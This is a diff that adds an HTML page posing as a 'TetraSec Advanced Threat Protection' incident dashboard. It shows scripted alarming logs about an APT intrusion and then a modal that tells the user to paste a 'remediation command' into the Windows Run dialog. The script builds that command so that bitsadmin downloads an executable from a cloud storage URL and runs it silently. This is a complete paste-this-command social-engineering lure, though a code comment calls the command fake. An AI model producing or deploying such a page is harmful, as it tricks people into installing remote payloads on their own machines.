@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TetraSec ATP - Incident Response</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-color: #1a1d21;
+            --panel-bg: #252a30;
+            --border-color: #3a414a;
+            --text-color: #cdd2da;
+            --text-muted: #8a919d;
+            --accent-red: #e44c4c;
+            --accent-yellow: #e4b44c;
+            --accent-blue: #4c90e4;
+            --accent-green: #4ce484;
+            --font-main: 'Roboto', sans-serif;
+            --font-mono: 'Roboto Mono', monospace;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        html, body {
+            height: 100%;
+            overflow: hidden;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            font-family: var(--font-main);
+            font-size: 14px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 15px;
+        }
+
+        .edr-container {
+            background-color: var(--panel-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            width: 100%;
+            max-width: 900px; /* Increased width */
+            height: 90vh;
+            max-height: 700px; /* Increased height */
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            box-shadow: 0 5px 25px rgba(0, 0, 0, 0.3);
+        }
+
+        .edr-header {
+            background-color: #30363e;
+            padding: 10px 15px;
+            border-bottom: 1px solid var(--border-color);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-shrink: 0;
+        }
+
+        .edr-header h1 {
+            font-size: 16px;
+            font-weight: 500;
+            color: var(--accent-blue);
+        }
+        .edr-header h1 span {
+            font-weight: 700;
+            color: var(--text-color);
+            margin-right: 5px;
+        }
+
+        .status-indicator {
+            font-size: 12px;
+            font-weight: 700;
+            padding: 4px 10px;
+            border-radius: 4px;
+            text-transform: uppercase;
+            animation: pulse 1.5s infinite;
+        }
+
+        .status-critical {
+            background-color: var(--accent-red);
+            color: #fff;
+            box-shadow: 0 0 10px var(--accent-red);
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.7; transform: scale(1.03); }
+            100% { opacity: 1; transform: scale(1); }
+        }
+
+        .edr-main {
+            display: flex;
+            flex-grow: 1;
+            overflow: hidden;
+        }
+
+        .edr-sidebar {
+            width: 220px; /* Wider sidebar */
+            background-color: #202429;
+            border-right: 1px solid var(--border-color);
+            padding: 15px;
+            display: flex;
+            flex-direction: column;
+            flex-shrink: 0;
+        }
+
+        .sidebar-section {
+            margin-bottom: 20px;
+        }
+
+        .sidebar-section h2 {
+            font-size: 13px;
+            color: var(--accent-blue);
+            margin-bottom: 10px;
+            text-transform: uppercase;
+            font-weight: 700;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 5px;
+        }
+
+        .sidebar-item {
+            font-size: 13px;
+            margin-bottom: 8px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+         .sidebar-item span:first-child {
+             color: var(--text-muted);
+         }
+         .sidebar-item span:last-child {
+             font-weight: 700;
+         }
+        .sidebar-item .value-red { color: var(--accent-red); }
+        .sidebar-item .value-yellow { color: var(--accent-yellow); }
+        .sidebar-item .value-green { color: var(--accent-green); }
+
+        .edr-content {
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            padding: 15px;
+            overflow: hidden;
+        }
+
+        .incident-summary {
+            background-color: #2c3137;
+            padding: 15px;
+            border-radius: 6px;
+            border: 1px solid var(--border-color);
+            margin-bottom: 15px;
+            flex-shrink: 0;
+        }
+
+        .incident-summary h3 {
+            color: var(--accent-red);
+            font-size: 16px;
+            margin-bottom: 8px;
+            font-weight: 700;
+        }
+
+        .incident-summary p {
+            font-size: 13px;
+            line-height: 1.5;
+            margin-bottom: 10px;
+            color: var(--text-muted);
+        }
+         .incident-summary p strong {
+             color: var(--text-color);
+             font-weight: 500;
+         }
+
+        .incident-actions {
+            display: flex;
+            gap: 10px;
+            margin-top: 10px;
+        }
+
+        .action-button {
+            background-color: var(--accent-blue);
+            color: #fff;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 4px;
+            font-size: 13px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s ease, transform 0.1s ease;
+        }
+        .action-button:hover {
+            background-color: #3a7bc8;
+        }
+         .action-button:active {
+             transform: scale(0.98);
+         }
+
+        .action-button.secondary {
+            background-color: #4a525e;
+        }
+        .action-button.secondary:hover {
+            background-color: #5f6976;
+        }
+        .action-button:disabled {
+            background-color: #3a414a;
+            cursor: not-allowed;
+            opacity: 0.6;
+        }
+
+
+        .log-feed-container {
+            flex-grow: 1;
+            background-color: #16181b;
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            padding: 15px;
+            overflow-y: auto; /* Changed to auto */
+            font-family: var(--font-mono);
+            font-size: 12px;
+            line-height: 1.6;
+            display: flex;
+            flex-direction: column-reverse; /* New logs appear at top */
+            position: relative;
+        }
+        .log-feed-container h4 {
+            position: sticky;
+            top: -15px; /* Stick title above */
+            background: #16181b;
+            padding: 5px 0 10px 0;
+            margin: -15px -15px 10px -15px; /* Adjust margins */
+            padding-left: 15px;
+            border-bottom: 1px solid var(--border-color);
+            color: var(--accent-blue);
+            font-family: var(--font-main);
+            font-size: 14px;
+            z-index: 1;
+        }
+
+        .log-entry {
+            margin-bottom: 5px; /* Space between entries */
+            white-space: pre-wrap; /* Allow wrapping */
+            word-break: break-word; /* Break long strings */
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(5px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .log-timestamp { color: var(--text-muted); margin-right: 10px; }
+        .log-level-INFO { color: var(--accent-blue); }
+        .log-level-WARN { color: var(--accent-yellow); font-weight: 700;}
+        .log-level-CRITICAL { color: var(--accent-red); font-weight: 700;}
+        .log-source { color: var(--accent-green); margin-right: 5px;}
+        .log-highlight { color: #fff; background-color: #555; padding: 0 3px; border-radius: 2px; }
+
+        /* Remediation Modal */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            display: none; /* Hidden by default */
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            backdrop-filter: blur(3px);
+        }
+
+        .modal-content {
+            background-color: var(--panel-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 25px;
+            width: 90%;
+            max-width: 550px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.4);
+            animation: modalEnter 0.3s ease-out;
+        }
+
+        @keyframes modalEnter {
+             from { opacity: 0; transform: scale(0.9); }
+             to { opacity: 1; transform: scale(1); }
+        }
+
+        .modal-content h2 {
+            color: var(--accent-red);
+            font-size: 18px;
+            margin-bottom: 15px;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 10px;
+        }
+
+        .modal-content p {
+            font-size: 14px;
+            line-height: 1.6;
+            margin-bottom: 15px;
+            color: var(--text-muted);
+        }
+         .modal-content p strong {
+             color: var(--text-color);
+             font-weight: 500;
+         }
+         .modal-content code {
+            background-color: #30363e;
+            color: var(--accent-yellow);
+            padding: 2px 5px;
+            border-radius: 3px;
+            font-family: var(--font-mono);
+            font-size: 13px;
+            border: 1px solid var(--border-color);
+         }
+
+         .command-area {
+            background-color: #16181b;
+            padding: 10px;
+            border-radius: 4px;
+            margin: 15px 0;
+            border: 1px solid var(--border-color);
+         }
+         .command-input {
+            font-family: var(--font-mono);
+            font-size: 13px;
+            color: var(--accent-green);
+            word-break: break-all; /* Ensure command breaks */
+         }
+
+        .modal-buttons {
+            text-align: right;
+            margin-top: 20px;
+        }
+        .modal-buttons .action-button {
+            margin-left: 10px;
+        }
+
+        /* Progress Bar */
+        .progress-bar-container {
+            width: 100%;
+            height: 8px;
+            background-color: #30363e;
+            border-radius: 4px;
+            overflow: hidden;
+            margin-top: 5px;
+        }
+        .progress-bar {
+            width: 0%;
+            height: 100%;
+            background-color: var(--accent-blue);
+            transition: width 0.5s ease-in-out;
+            border-radius: 4px;
+        }
+        .progress-bar.red { background-color: var(--accent-red); }
+    </style>
+</head>
+<body>
+    <div class="edr-container">
+        <div class="edr-header">
+            <h1><span>TetraSec</span> Advanced Threat Protection</h1>
+            <div class="status-indicator status-critical" id="mainStatus">CRITICAL THREAT DETECTED</div>
+        </div>
+        <div class="edr-main">
+            <div class="edr-sidebar">
+                <div class="sidebar-section">
+                    <h2>System Status</h2>
+                    <div class="sidebar-item"><span>Hostname:</span> <span id="hostname">DESKTOP-T3TR4</span></div>
+                    <div class="sidebar-item"><span>Integrity:</span> <span class="value-red" id="integrity">Compromised</span></div>
+                    <div class="sidebar-item"><span>Network:</span> <span class="value-yellow" id="network">Contained</span></div>
+                    <div class="sidebar-item"><span>ATP Agent:</span> <span class="value-green">Active</span></div>
+                </div>
+                <div class="sidebar-section">
+                    <h2>Incident Metrics</h2>
+                     <div class="sidebar-item"><span>Severity:</span> <span class="value-red">Critical (9.8)</span></div>
+                     <div class="sidebar-item"><span>Detected:</span> <span id="detectionTime">Just Now</span></div>
+                     <div class="sidebar-item"><span>Affected Hosts:</span> <span class="value-red">1</span></div>
+                     <div class="sidebar-item"><span>Blocked C2:</span> <span class="value-yellow" id="blockedC2">0</span></div>
+                </div>
+                 <div class="sidebar-section">
+                    <h2>Containment Progress</h2>
+                    <div class="sidebar-item"><span>Isolation:</span> <span class="value-yellow">Partial</span></div>
+                    <div class="sidebar-item"><span>Remediation:</span> <span class="value-red">Pending</span></div>
+                    <div class="progress-bar-container">
+                        <div class="progress-bar red" id="containmentProgress" style="width: 30%;"></div>
+                    </div>
+                </div>
+            </div>
+            <div class="edr-content">
+                <div class="incident-summary">
+                    <h3>CRITICAL INCIDENT: APT-C-TETRAX Activity Detected</h3>
+                    <p>
+                        Multiple high-confidence indicators point to an active intrusion by <strong>APT-C-TETRAX</strong>.
+                        Initial vector likely involved exploitation of <strong>CVE-2024-T3TR4</strong>. Persistence established via WMI event subscription.
+                        <strong>Immediate action required to prevent data exfiltration and ransomware deployment.</strong>
+                    </p>
+                    <div class="incident-actions">
+                        <button class="action-button" id="initiateRemediationBtn">Initiate Remediation Protocol</button>
+                        <button class="action-button secondary" disabled>View Forensics</button>
+                    </div>
+                </div>
+                <div class="log-feed-container" id="logFeed">
+                     <h4>Live Event Log</h4>
+                     <!-- Logs will be added here by JS -->
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Remediation Modal -->
+    <div class="modal-overlay" id="remediationModal">
+        <div class="modal-content">
+            <h2>Manual Remediation Required</h2>
+            <p>
+                Automated remediation failed due to suspected rootkit activity (<strong>Rootkit.TetraPux.Gen</strong>).
+                Manual execution of the deep system diagnostic and cleanup script is necessary.
+            </p>
+            <p>
+                 Please follow these steps precisely:
+                 <ol style="margin-left: 20px; margin-top: 10px; line-height: 1.8; color: var(--text-muted);">
+                     <li>Press <code style="color: var(--text-color)">Win + R</code> to open the Run dialog.</li>
+                     <li>Copy the <strong>entire</strong> command below.</li>
+                     <li>Paste the command into the Run dialog.</li>
+                     <li>Press <strong>Enter</strong> to execute the script.</li>
+                 </ol>
+            </p>
+            <div class="command-area">
+                <label style="font-size: 12px; color: var(--text-muted); display: block; margin-bottom: 5px;">TetraSec Remediation Command (ID: <span id="commandId"></span>):</label>
+                <div class="command-input" id="remediationCommand"></div>
+            </div>
+             <p style="font-size: 12px; color: var(--accent-yellow); margin-top: 15px;">
+                <strong>Warning:</strong> Do not modify the command. Incorrect execution may lead to system instability.
+            </p>
+            <div class="modal-buttons">
+                 <button class="action-button secondary" id="copyCommandBtn">Copy Command</button>
+                 <button class="action-button" id="closeModalBtn">Close</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const logFeed = document.getElementById('logFeed');
+        const initiateRemediationBtn = document.getElementById('initiateRemediationBtn');
+        const remediationModal = document.getElementById('remediationModal');
+        const closeModalBtn = document.getElementById('closeModalBtn');
+        const copyCommandBtn = document.getElementById('copyCommandBtn');
+        const remediationCommand = document.getElementById('remediationCommand');
+        const commandIdSpan = document.getElementById('commandId');
+        const blockedC2Span = document.getElementById('blockedC2');
+        const containmentProgress = document.getElementById('containmentProgress');
+        const mainStatus = document.getElementById('mainStatus');
+        const detectionTime = document.getElementById('detectionTime');
+
+        let logCounter = 0;
+        let blockedCount = 0;
+        let detectionTimestamp = Date.now();
+
+        const logMessages = [
+            { level: 'INFO', source: 'NetShield', msg: 'Network isolation protocol initiated for endpoint DESKTOP-T3TR4.' },
+            { level: 'WARN', source: 'MemGuard', msg: 'Suspicious process injection detected: target svchost.exe (PID 1337).' },
+            { level: 'CRITICAL', source: 'ThreatIntel', msg: 'High-confidence match for APT-C-TETRAX C2 server signature: 198.51.100.42.' },
+            { level: 'INFO', source: 'NetShield', msg: 'Blocked outbound connection to C2 server 198.51.100.42:443.' },
+            { level: 'WARN', source: 'FileGuard', msg: 'Attempted modification of critical system file: C:\\Windows\\System32\\drivers\\tetrapux.sys.' },
+            { level: 'CRITICAL', source: 'BehaviorMon', msg: 'Detected WMI persistence mechanism installation (T1546.003).' },
+             { level: 'INFO', source: 'NetShield', msg: 'Blocked outbound DNS Tunneling attempt via port 53 to dns.ttpux-c2.com.' },
+             { level: 'WARN', source: 'ProcGuard', msg: 'Powershell execution detected with obfuscated payload (T1059.001).' },
+             { level: 'CRITICAL', source: 'HeuristicEng', msg: 'Ransomware precursor activity detected: volume shadow copy deletion attempt.' },
+             { level: 'INFO', source: 'AutoRemediate', msg: 'Automated remediation attempt started...' },
+             { level: 'CRITICAL', source: 'AutoRemediate', msg: 'Remediation failed. Rootkit interference suspected. Manual intervention required.' }
+        ];
+
+        function addLogEntry(log) {
+            const entry = document.createElement('div');
+            entry.classList.add('log-entry');
+            const timestamp = new Date().toLocaleTimeString();
+            entry.innerHTML = `<span class="log-timestamp">${timestamp}</span> <span class="log-level-${log.level}">${log.level}</span> <span class="log-source">[${log.source}]</span> ${log.msg}`;
+
+            // Insert new log at the top (due to flex-direction: column-reverse)
+             logFeed.insertBefore(entry, logFeed.firstChild);
+
+            // Highlight specific terms
+            entry.innerHTML = entry.innerHTML.replace(/(APT-C-TETRAX|198\.51\.100\.42|T1546\.003|T1059\.001|Rootkit)/g, '<span class="log-highlight">$1</span>');
+
+            // Keep log feed scrolled to the top (which is the bottom visually)
+            // logFeed.scrollTop = 0; // No longer needed with flex-direction reverse
+
+            // Update metrics based on logs
+             if (log.msg.includes('Blocked outbound')) {
+                 blockedCount++;
+                 blockedC2Span.textContent = blockedCount;
+             }
+             if (log.msg.includes('Manual intervention required')) {
+                 initiateRemediationBtn.disabled = false;
+                 initiateRemediationBtn.textContent = "Initiate Manual Remediation";
+                 containmentProgress.style.width = '75%';
+                 mainStatus.textContent = "ACTION REQUIRED";
+             }
+        }
+
+        function startLogging() {
+            if (logCounter < logMessages.length) {
+                addLogEntry(logMessages[logCounter]);
+                logCounter++;
+                const delay = logCounter === 1 ? 500 : Math.random() * (2500 - 800) + 800; // Faster first log
+                setTimeout(startLogging, delay);
+            }
+        }
+
+         function updateDetectionTime() {
+            const now = Date.now();
+            const diffSeconds = Math.floor((now - detectionTimestamp) / 1000);
+            const diffMinutes = Math.floor(diffSeconds / 60);
+
+            if (diffSeconds < 60) {
+                 detectionTime.textContent = `${diffSeconds}s ago`;
+            } else if (diffMinutes < 60) {
+                detectionTime.textContent = `${diffMinutes}m ago`;
+            } else {
+                 detectionTime.textContent = ">1h ago";
+            }
+         }
+
+
+        // Initialize
+        initiateRemediationBtn.disabled = true; // Disable button initially
+        setTimeout(startLogging, 500); // Start logging after a short delay
+        setInterval(updateDetectionTime, 5000); // Update time every 5 seconds
+
+        // Modal Logic
+        initiateRemediationBtn.addEventListener('click', () => {
+            // Generate a unique-ish ID for the command
+             const uniqueId = Math.random().toString(36).substring(2, 10).toUpperCase();
+             commandIdSpan.textContent = uniqueId;
+
+            // Define the fake malicious command - MORE REALISTIC
+            // Uses bitsadmin (common LOLBAS) to download and execute
+             const fakeCommand = `cmd.exe /c "bitsadmin /transfer TetraSecFix_${uniqueId} /download /priority high https://storage.googleapis.com/tetrapux-files/atp_diag_fix.exe %TEMP%\\ts_fix_${uniqueId}.exe && %TEMP%\\ts_fix_${uniqueId}.exe /silent /id=${uniqueId}"`;
+
+            remediationCommand.textContent = fakeCommand; // Use textContent to prevent HTML injection interpretation
+            remediationModal.style.display = 'flex';
+        });
+
+        closeModalBtn.addEventListener('click', () => {
+            remediationModal.style.display = 'none';
+        });
+
+        copyCommandBtn.addEventListener('click', () => {
+            navigator.clipboard.writeText(remediationCommand.textContent)
+                .then(() => {
+                    copyCommandBtn.textContent = 'Copied!';
+                    copyCommandBtn.disabled = true;
+                    setTimeout(() => {
+                        copyCommandBtn.textContent = 'Copy Command';
+                        copyCommandBtn.disabled = false;
+                    }, 1500);
+                })
+                .catch(err => {
+                    console.error('Failed to copy command: ', err);
+                    copyCommandBtn.textContent = 'Copy Failed';
+                     setTimeout(() => {
+                        copyCommandBtn.textContent = 'Copy Command';
+                    }, 1500);
+                });
+        });
+
+         // Close modal if clicking outside of it
+         remediationModal.addEventListener('click', (event) => {
+            if (event.target === remediationModal) {
+                remediationModal.style.display = 'none';
+            }
+         });
+
+    </script>
+</body>
+</html>
